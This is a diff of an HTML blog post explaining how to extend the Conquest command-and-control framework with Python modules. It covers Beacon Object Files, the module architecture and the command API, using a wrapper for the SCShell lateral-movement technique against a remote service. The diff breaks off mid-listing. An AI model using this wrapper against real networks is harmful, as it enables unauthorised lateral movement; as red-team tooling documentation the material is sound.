@@ -32,12 +32,12 @@
         <meta property="og:url" content="http://localhost:1313/blog/conquest-modules/">
   <meta property="og:site_name" content="Home">
   <meta property="og:title" content="Extending Conquest using Python Modules">
-  <meta property="og:description" content="Command and control (C2) frameworks are sometimes also referred to as post-exploitation frameworks. This is because they enable their users to execute post-exploitation capabilities on compromised systems. To make the use of these capabilities as easy as possible, Conquest, offers a advanced module system for extending the framework with Beacon Object Files or other third-party offensive tooling. This blog post showcases the creation of new commands using the Conquest Python API.">
+  <meta property="og:description" content="Command and control (C2) frameworks are sometimes also referred to as post-exploitation frameworks. This is because they enable their users to execute post-exploitation capabilities on compromised systems. To make the use of these capabilities as easy as possible, Conquest offers an advanced module system for extending the framework with Beacon Object Files or other third-party offensive tooling. This blog post showcases the creation of new commands using the Python API and serves as reference material for Conquest module development.">
   <meta property="og:locale" content="en_us">
   <meta property="og:type" content="article">
     <meta property="article:section" content="blog">
-    <meta property="article:published_time" content="2026-02-25T21:11:46+01:00">
-    <meta property="article:modified_time" content="2026-02-25T21:11:46+01:00">
+    <meta property="article:published_time" content="2026-03-13T14:46:12+01:00">
+    <meta property="article:modified_time" content="2026-03-13T14:46:12+01:00">
 
     
 
@@ -45,7 +45,7 @@
         
   <meta name="twitter:card" content="summary">
   <meta name="twitter:title" content="Extending Conquest using Python Modules">
-  <meta name="twitter:description" content="Command and control (C2) frameworks are sometimes also referred to as post-exploitation frameworks. This is because they enable their users to execute post-exploitation capabilities on compromised systems. To make the use of these capabilities as easy as possible, Conquest, offers a advanced module system for extending the framework with Beacon Object Files or other third-party offensive tooling. This blog post showcases the creation of new commands using the Conquest Python API.">
+  <meta name="twitter:description" content="Command and control (C2) frameworks are sometimes also referred to as post-exploitation frameworks. This is because they enable their users to execute post-exploitation capabilities on compromised systems. To make the use of these capabilities as easy as possible, Conquest offers an advanced module system for extending the framework with Beacon Object Files or other third-party offensive tooling. This blog post showcases the creation of new commands using the Python API and serves as reference material for Conquest module development.">
 
     <link rel="stylesheet" href="/style.css" integrity="">
 
@@ -76,6 +76,13 @@
 
 
 
+
+    
+        
+        
+            <script defer src="/js/builtin-copy.js" integrity=""></script>
+        
+    
 
 
 
@@ -215,7 +222,7 @@
 
 <div class="blog-post-meta">
     
-    <span class="date">February 25, 2026</span>
+    <span class="date">March 13, 2026</span>
     
     
     
@@ -248,10 +255,13 @@
     <li><a href="#module-system-architecture">Module System Architecture</a></li>
     <li><a href="#creating-commands">Creating Commands</a>
       <ul>
-        <li><a href="#python-api-reference">Python API Reference</a></li>
+        <li><a href="#command-definition">Command Definition</a></li>
+        <li><a href="#command-arguments">Command Arguments</a></li>
+        <li><a href="#command-handler">Command Handler</a></li>
+        <li><a href="#command-registration">Command Registration</a></li>
       </ul>
     </li>
-    <li><a href="#example-scshellpy">Example: scshell.py</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
   </ul>
 </nav>
         
@@ -272,7 +282,23 @@
 <article class="line-numbers">
     
     
-    <p>Command and control (C2) frameworks are sometimes also referred to as post-exploitation frameworks. This is because they enable their users to execute post-exploitation capabilities on compromised systems. To make the use of these capabilities as easy as possible, <a href="https://github.com/jakobfriedl/conquest/"><strong>Conquest</strong>,</a> offers a advanced module system for extending the framework with Beacon Object Files or other third-party offensive tooling. This blog post showcases the creation of new commands using the Conquest Python API.</p>
+    <p>Command and control (C2) frameworks are sometimes also referred to as post-exploitation frameworks. This is because they enable their users to execute post-exploitation capabilities on compromised systems. To make the use of these capabilities as easy as possible, <a href="https://github.com/jakobfriedl/conquest/"><strong>Conquest</strong></a> offers an advanced module system for extending the framework with Beacon Object Files or other third-party offensive tooling. This blog post showcases the creation of new commands using the Python API and serves as reference material for Conquest module development.</p>
+<p>
+
+
+
+
+
+
+
+
+
+<figure class="">
+    <div>
+        <img loading="lazy" alt="Conquest Python Module" src=" /img/c2-module-system/1.png">
+    </div>
+    
+</figure></p>
 
 <h2 id="the-bare-minimum" class="header-anchor-wrapper">The Bare Minimum
   <a href="#the-bare-minimum" class="header-anchor-link">
@@ -289,9 +315,23 @@
   </a>
 </h2>
 
-<p>agent only contains the bare minimum of features
-features that allow additional post-ex tools to be executed bof/dotnet
-Enable-able to keep agent binary lightweight</p>
+<p>The primary reason why post-exploitation capabilities are usually out-sourced to third party tools is because this allows the C2 agent to remain as lightweight as possible. The more code and features the agent contains, the larger its detection surface, so the focus is to limit the built-in functionality to the bare minimum. This includes essential features such as being able to send data back to the team server via a network protocol between sleep cycles, basic target reconnaissance, self-termination and some sort of task execution mechanism. Other capabilities, such as techniques for performing local and remote situational awareness, code execution and post-exploitation are either optionally enabled or fully external. In Conquest, certain modules can be selected during payload generation to be included in the agent in order to keep the agent size reduced to the essentials when specific capabilities are not needed during an engagement. Shown in the screenshot below, these <em>modules</em> include filesystem operations, file transfer, token manipulation and most importantly, different techniques to execute code or additional tools. In the next section, we will take a closer look at one of the most widely used: <em>Beacon Object Files</em>.</p>
+<p>
+
+
+
+
+
+
+
+
+
+<figure class="">
+    <div>
+        <img loading="lazy" alt="Conquest Core Modules" src=" /img/c2-module-system/0.png">
+    </div>
+    
+</figure></p>
 
 <h2 id="post-exploitation-using-beacon-object-files" class="header-anchor-wrapper">Post-Exploitation using Beacon Object Files
   <a href="#post-exploitation-using-beacon-object-files" class="header-anchor-link">
@@ -308,9 +348,15 @@ Enable-able to keep agent binary lightweight</p>
   </a>
 </h2>
 
-<p>what are Bofs
-why bofs?
-examples for bofs</p>
+<p>A Beacon Object File (BOF) is a small, compiled C program that utilizes internal Beacon API functions to execute post-exploitation capabilities directly within a C2 agent&rsquo;s process. Rather than spawning a new process, a COFF/BOF loader parses the <code>.o</code> file, resolves external symbol and Beacon API references and executes the resulting position-independent code (PIC) directly in memory<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>. Once execution completes, the memory allocated for the object file is released. This way of executing code has significant OPSEC benefits, as it avoids the noisy fork&amp;run pattern common to process injection techniques and leaves a minimal footprint on the compromised system. However, this approach comes with tradeoffs. Since BOFs run in-process, a crash or unhandled exception will kill the agent along with it, potentially causing the operator to lose access to the target entirely. Additionally, BOFs cannot use the C runtime, as they are unlinked object files where all symbol references for Windows APIs and Beacon API functions are resolved dynamically by the object file loader at runtime. This makes implementing anything beyond simple, self-contained tasks considerably more involved<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup>.</p>
+<p>The Beacon/BOF API defines a set of functions that allow a BOF to interact with the C2 agent. For instance, functions like <code>BeaconDataInt</code> or <code>BeaconDataParse</code> can be used to retrieve arguments passed to the object file, while <code>BeaconOutput</code> or <code>BeaconPrintf</code> can be used to print information to the agent console. Arguments are packed into a binary buffer by the C2 client before being transmitted to the agent, where the BOF unpacks them sequentially using the <code>datap</code> parser struct. Windows API calls are referenced using a specific naming convention, such as <code>KERNEL32$VirtualAlloc</code>, which the loader uses to resolve the correct function from the appropriate module at runtime<sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup>.</p>
+<p>BOFs are extremely suitable for small post-exploitation tasks, such as situational-awareness, credential collection or network reconnaissance. Some frameworks even support asynchronous BOF execution, where the BOF runs in a separate thread, allowing the agent to remain interactive while the operation completes in the background<sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref">4</a></sup>. There are numerous collections of public BOF files on GitHub. Although most of them have been designed specifically for Cobalt Strike, Conquest&rsquo;s BOF loader uses the same Beacon API implementation, allowing them to be used in that framework as well. Notable mentions include the following:</p>
+<ul>
+<li><a href="https://github.com/trustedsec/CS-Situational-Awareness-BOF">CS-Situational-Awareness-BOF</a></li>
+<li><a href="https://github.com/trustedsec/CS-Remote-OPs-BOF">CS-Remote-OPs-BOFs</a></li>
+<li><a href="https://github.com/outflanknl/C2-Tool-Collection">Outflank C2-Tool-Collection</a></li>
+<li><a href="https://github.com/mertdas/PrivKit">PrivKit</a></li>
+</ul>
 
 <h2 id="module-system-architecture" class="header-anchor-wrapper">Module System Architecture
   <a href="#module-system-architecture" class="header-anchor-link">
@@ -327,9 +373,50 @@ examples for bofs</p>
   </a>
 </h2>
 
-<p>Python Scripting Engine
-Script Manager
-Modules vs. Commands vs. Command Groups</p>
+<p>Conquest&rsquo;s module system allows users to turn their favourite BOFs into complete agent commands using a powerful Python Scripting API. The client features a built-in Python engine based on <code>nimpy</code> which loads and processes Python modules that are uploaded using the <em>Script Manager</em> view. The commands defined in these files are added to the specified command groups or modules. The difference between these two concepts is the following:</p>
+<ul>
+<li><strong>Modules</strong> can be enabled/disabled during payload generation. In practice, this should only be used for the default core modules (filesystem, token, &hellip;)</li>
+<li><strong>Command Groups</strong> are used to structure commands in the output of the <code>help</code> command. This allows the module author to group together commands that fall under the same category. Every command needs to be added to at least one command group to be used.</li>
+</ul>
+<p>The diagram below describes the module system architecture and how the different components work together. The engine processes uploaded Python scripts and registers them to command groups or modules. When a command-line is entered into the agent console, the client parses the input and looks up the matching command in an internal table. From there, the arguments are parsed and packaged into a task object that can then be sent to the team server and queued.</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+<figure class=" img-dark">
+    <div>
+        <img loading="lazy" alt="Module System Architecture" src=" /img/c2-module-system/arch-dark.png#dark">
+    </div>
+    
+</figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure class=" img-light">
+    <div>
+        <img loading="lazy" alt="Module System Architecture" src=" /img/c2-module-system/arch-light.png#light">
+    </div>
+    
+</figure></p>
 
 <h2 id="creating-commands" class="header-anchor-wrapper">Creating Commands
   <a href="#creating-commands" class="header-anchor-link">
@@ -346,12 +433,27 @@ Modules vs. Commands vs. Command Groups</p>
   </a>
 </h2>
 
-<p>Name, Description, Example, Mitre techniques
-Arguments &amp; Flags
-Handler</p>
-
-<h3 id="python-api-reference" class="header-anchor-wrapper">Python API Reference
-  <a href="#python-api-reference" class="header-anchor-link">
+<p>With the theory covered, this part of the blog post shows practical examples of how the Conquest Python API can be used to create commands and add them to the framework. Creating a command normally involves four steps.</p>
+<ol>
+<li><em>Command definition</em>: Command name, description, example, MITRE ATT&amp;CK techniques.</li>
+<li><em>Argument definition</em>: Arguments that are expected by the command. Conquest supports positional or flag arguments, as well as required and optional ones.</li>
+<li><em>Command handler definition</em>: Processing steps that are applied to the command arguments before it is executed. This is fundamentally needed for alias-commands, such as BOF wrappers.</li>
+<li><em>Command registration</em>: Command needs to be registered to a command group or optionally a module.</li>
+</ol>
+<p>Every Conquest module starts with the imports at the top. The <code>conquest</code> module is required to access the Python API, but any other standard Python libraries can be added as well.</p>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;" class="mc-table"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> conquest
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> os.path
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="command-definition" class="header-anchor-wrapper">Command Definition
+  <a href="#command-definition" class="header-anchor-link">
     <svg width="16px" height="16px" viewBox="0 0 24 24">
 <svg
     xmlns="http://www.w3.org/2000/svg"
@@ -365,13 +467,590 @@ Handler</p>
   </a>
 </h3>
 
-<p>get_string()&hellip;</p>
-<p>bof_pack           &lt;&mdash;&mdash;&mdash;&mdash;&mdash; Explain in detail</p>
-<p>execute_commands vs execute_alias</p>
-<p>Using python libraries in Conquest modules</p>
+<p>Although not necessarily required, it is recommended to assign the command definition to a variable. The outer parentheses allow for clean line continuation when chaining multiple API calls together. The <code>createCommand</code> function takes the following arguments:</p>
+<table class="mc-table">
+  <thead>
+      <tr>
+          <th>Name</th>
+          <th>Type</th>
+          <th>Description</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>name</code></td>
+          <td><code>string</code></td>
+          <td>Name of the command. This field acts as the identifying key in the internal command table on the client.</td>
+      </tr>
+      <tr>
+          <td><code>description</code></td>
+          <td><code>string</code></td>
+          <td>Extended description that is displayed in the output of the <code>help</code> command.</td>
+      </tr>
+      <tr>
+          <td><code>example</code></td>
+          <td><code>string</code></td>
+          <td>Example usage of the command.</td>
+      </tr>
+      <tr>
+          <td><code>message</code></td>
+          <td><code>string</code></td>
+          <td>Message that is displayed in the agent console when the command is executed.</td>
+      </tr>
+      <tr>
+          <td><code>mitre</code></td>
+          <td><code>list[string]</code></td>
+          <td>List of MITRE ATT&amp;CK techniques that apply to the command.</td>
+      </tr>
+  </tbody>
+</table>
+<p>This blog post takes the <code>scshell</code> command as an example, which wraps a variation of the <a href="https://github.com/Mr-Un1k0d3r/SCShell">SCShell</a> BOF. This technique enables lateral movement via SMB without the need for creating a service on the target system.</p>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;" class="mc-table"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>cmd_scshell = (
+</span></span><span style="display:flex;"><span>    conquest.createCommand(name=<span style="color:#0ff;font-weight:bold">&#34;scshell&#34;</span>, 
+</span></span><span style="display:flex;"><span>                           description=<span style="color:#0ff;font-weight:bold">&#34;Perform fileless lateral movement by modifying an existing remote service&#39;s binary path (SCShell tool).&#34;</span>, 
+</span></span><span style="display:flex;"><span>                           example=<span style="color:#0ff;font-weight:bold">&#34;scshell dc01 bin/monarch.smb_x64.svc.exe --service Spooler --name update.exe&#34;</span>,
+</span></span><span style="display:flex;"><span>                           message=<span style="color:#0ff;font-weight:bold">&#34;Tasked agent to perform fileless lateral movement via SCShell.&#34;</span>, 
+</span></span><span style="display:flex;"><span>                           mitre=[<span style="color:#0ff;font-weight:bold">&#34;T1021.002&#34;</span>])
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="command-arguments" class="header-anchor-wrapper">Command Arguments
+  <a href="#command-arguments" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
 
-<h2 id="example-scshellpy" class="header-anchor-wrapper">Example: scshell.py
-  <a href="#example-scshellpy" class="header-anchor-link">
+</svg>
+  </a>
+</h3>
+
+<p>Arguments passed to a command must be defined in the Python module. Conquest supports four data types (string, int, bool, and file) and each argument can be defined as either a positional or flag argument and marked as required or optional. The following arguments can be set:</p>
+<table class="mc-table">
+  <thead>
+      <tr>
+          <th>Name</th>
+          <th>Type</th>
+          <th>Description</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>flag</code></td>
+          <td><code>string</code></td>
+          <td>Only required for flag arguments. Needs to start with a prefix, which can either be <code>-</code> or <code>--</code>.</td>
+      </tr>
+      <tr>
+          <td><code>name</code></td>
+          <td><code>string</code></td>
+          <td>Argument name, used for internal reference.</td>
+      </tr>
+      <tr>
+          <td><code>description</code></td>
+          <td><code>string</code></td>
+          <td>Description of the argument shown in help output.</td>
+      </tr>
+      <tr>
+          <td><code>required</code></td>
+          <td><code>bool</code></td>
+          <td>Whether the argument is required (default: <code>False</code>)</td>
+      </tr>
+      <tr>
+          <td><code>default</code></td>
+          <td><code>string</code> / <code>int</code> / <code>bool</code></td>
+          <td>Default value if the argument is not provided (defaults: <code>int:0</code>, <code>string:&quot;&quot;</code>, <code>bool:False</code>).</td>
+      </tr>
+      <tr>
+          <td><code>nargs</code></td>
+          <td><code>int</code></td>
+          <td>Number of values to consume. Setting this field to <code>-1</code> makes the argument consume all remaining positional tokens, joining them into a single value (default: <code>1</code>).</td>
+      </tr>
+  </tbody>
+</table>
+<p>In the case of <code>scshell</code>, the following arguments are supported.</p>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;" class="mc-table"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>.addArgString(<span style="color:#0ff;font-weight:bold">&#34;target&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;Target system hostname or IP address.&#34;</span>, <span style="color:#fff;font-weight:bold">True</span>)
+</span></span><span style="display:flex;"><span>.addArgFile(<span style="color:#0ff;font-weight:bold">&#34;payload&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;Path to payload to execute on the target.&#34;</span>, <span style="color:#fff;font-weight:bold">True</span>)
+</span></span><span style="display:flex;"><span>.addFlagString(<span style="color:#0ff;font-weight:bold">&#34;--service&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;service&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;Target service (default: defragsvc).&#34;</span>, <span style="color:#fff;font-weight:bold">False</span>, <span style="color:#0ff;font-weight:bold">&#34;defragsvc&#34;</span>)
+</span></span><span style="display:flex;"><span>.addFlagString(<span style="color:#0ff;font-weight:bold">&#34;--name&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;name&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;Target service name (default: Name of the target service).&#34;</span>)
+</span></span><span style="display:flex;"><span>.addFlagString(<span style="color:#0ff;font-weight:bold">&#34;--share&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;share&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;Share for copying payload (default: ADMIN$).&#34;</span>, <span style="color:#fff;font-weight:bold">False</span>, <span style="color:#0ff;font-weight:bold">&#34;ADMIN$&#34;</span>)
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="command-handler" class="header-anchor-wrapper">Command Handler
+  <a href="#command-handler" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h3>
+
+<p>For BOF wrappers, the command handler is the most critical part of the command definition, as it is responsible for tasking the agent to load and execute a BOF with the correct arguments. Since <code>execute_alias</code> internally dispatches the <code>bof</code> command, the handler must construct a hex-encoded argument string that matches the argument layout expected by the object file. The handler is a function that takes three arguments:</p>
+<table class="mc-table">
+  <thead>
+      <tr>
+          <th>Name</th>
+          <th>Type</th>
+          <th>Description</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>agentId</code></td>
+          <td><code>string</code></td>
+          <td>ID of the agent that is tasked to execute the command.</td>
+      </tr>
+      <tr>
+          <td><code>cmdline</code></td>
+          <td><code>string</code></td>
+          <td>Raw console input.</td>
+      </tr>
+      <tr>
+          <td><code>args</code></td>
+          <td><code>list[TaskArg]</code></td>
+          <td>List of parsed task arguments.</td>
+      </tr>
+  </tbody>
+</table>
+<p>Within the handler, Conquest&rsquo;s Python API provides a set of <code>get_&lt;type&gt;</code> functions to extract individual arguments from the args list by index, in the same order they were defined on the command. This step also allows for additional validation and preprocessing. For instance, this includes handling mutually exclusive flags or converting string options to integer values before passing them to the BOF.</p>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;" class="mc-table"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">def</span> _scshell(agentId, cmdline, args): 
+</span></span><span style="display:flex;"><span>    target = conquest.get_string(args, <span style="color:#ff0;font-weight:bold">0</span>)
+</span></span><span style="display:flex;"><span>    payloadName, payloadBytes = conquest.get_file(args, <span style="color:#ff0;font-weight:bold">1</span>)
+</span></span><span style="display:flex;"><span>    service = conquest.get_string(args, <span style="color:#ff0;font-weight:bold">2</span>)
+</span></span><span style="display:flex;"><span>    name = conquest.get_string(args, <span style="color:#ff0;font-weight:bold">3</span>)
+</span></span><span style="display:flex;"><span>    share = conquest.get_string(args, <span style="color:#ff0;font-weight:bold">4</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#007f7f"># Format path</span>
+</span></span><span style="display:flex;"><span>    path = <span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#34;</span><span style="color:#0ff;font-weight:bold">\\\\</span><span style="color:#0ff;font-weight:bold">{</span>target<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">\\</span><span style="color:#0ff;font-weight:bold">{</span>share<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">\\</span><span style="color:#0ff;font-weight:bold">{</span>name <span style="color:#fff;font-weight:bold">if</span> name <span style="color:#fff;font-weight:bold">else</span> service<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> not path.endswith(<span style="color:#0ff;font-weight:bold">&#34;.exe&#34;</span>): path += <span style="color:#0ff;font-weight:bold">&#34;.exe&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The <code>bof_pack</code> function constructs the hex-encoded argument string passed to the BOF, modeled after the identically named function in Cobalt Strike&rsquo;s Aggressor Script. It takes a format string where each character represents the type of one argument, followed by the arguments themselves, and returns a hex string prefixed with the total data length.</p>
+<table class="mc-table">
+  <thead>
+      <tr>
+          <th>Type char</th>
+          <th>Description</th>
+          <th>Unpacking Beacon API</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>b</code></td>
+          <td>Binary data with 4-byte length prefix</td>
+          <td><code>BeaconDataExtract</code></td>
+      </tr>
+      <tr>
+          <td><code>i</code></td>
+          <td>4-byte integer</td>
+          <td><code>BeaconDataInt</code></td>
+      </tr>
+      <tr>
+          <td><code>s</code></td>
+          <td>2-byte short integer</td>
+          <td><code>BeaconDataShort</code></td>
+      </tr>
+      <tr>
+          <td><code>z</code></td>
+          <td>Null-terminated UTF-8 string with 4-byte length prefix</td>
+          <td><code>BeaconDataExtract</code></td>
+      </tr>
+      <tr>
+          <td><code>Z</code></td>
+          <td>Null-terminated UTF-16 wide string with 4-byte length prefix</td>
+          <td><code>BeaconDataExtract</code></td>
+      </tr>
+  </tbody>
+</table>
+<p>To figure out which type chars are expected by the BOF, we take a look at its <code>go</code> entry point. In the case of the SCShell BOF, <code>BeaconDataExtract</code> is called 4 times and assigned to <code>CHAR *</code> variables. This means that the <code>z</code> type char is to be used. Since <code>get_file</code> returns the contents of the executable as a byte array, we use <code>b</code> to pack the binary data, resulting in the format string <code>zzzb</code>.</p>
+<p>
+
+
+
+
+
+
+
+
+
+<figure class="">
+    <div>
+        <img loading="lazy" alt="SCShell BOF entry point" src=" /img/c2-module-system/3.png">
+    </div>
+    
+</figure>
+
+
+
+
+
+    
+
+
+<div class="color-block content-margin color-block-caption">
+
+    
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <polyline points="17 11 12 6 7 11"></polyline><polyline points="17 18 12 13 7 18"></polyline>
+</svg>
+
+
+
+    <div class="color-block-content">
+        Entry point of the <code>scshell</code> BOF.
+    </div>
+</div>
+</p>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;" class="mc-table"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
+</span></code></pre></td>
